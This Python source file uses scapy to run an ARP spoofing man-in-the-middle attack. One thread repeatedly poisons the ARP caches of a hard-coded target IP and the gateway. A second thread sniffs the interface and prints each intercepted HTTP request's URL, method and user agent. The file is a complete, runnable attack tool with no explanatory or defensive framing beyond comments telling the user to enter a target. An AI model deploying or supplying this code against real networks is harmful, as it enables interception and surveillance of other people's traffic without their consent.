import scapy.all as scapy
import time
import threading
from scapy.layers.http import HTTPRequest  # Import HTTPRequest layer to detect HTTP requests

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    
    if answered_list:  # Check if we got a response
        return answered_list[0][1].hwsrc
    else:
        return None  # Return None if no response

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"No response received for IP: {target_ip}")
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac is None or source_mac is None:
        print(f"Failed to restore ARP table for {destination_ip} and {source_ip}")
        return
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def arp_spoofing(target_ip, gateway_ip):
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] ARP Spoof Stopped")

def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        print(f"[+] HTTP Request >> {url}")
        if packet[HTTPRequest].Method:
            method = packet[HTTPRequest].Method.decode()
            print(f"\tMethod: {method}")
        if packet[HTTPRequest].User_Agent:
            user_agent = packet[HTTPRequest].User_Agent.decode()
            print(f"\tUser-Agent: {user_agent}")

if __name__ == "__main__":
    target_ip = "192.168.137.240"  # Enter your target IP
    gateway_ip = "192.168.137.1"  # Enter your gateway's IP
    interface = "MediaTek Wi-Fi 6 MT7921 Wireless LAN Card"  # Replace with your network interface

    thread_arp = threading.Thread(target=arp_spoofing, args=(target_ip, gateway_ip))
    thread_sniff = threading.Thread(target=sniff, args=(interface,))

    thread_arp.start()
    thread_sniff.start()

    thread_arp.join()
    thread_sniff.join()



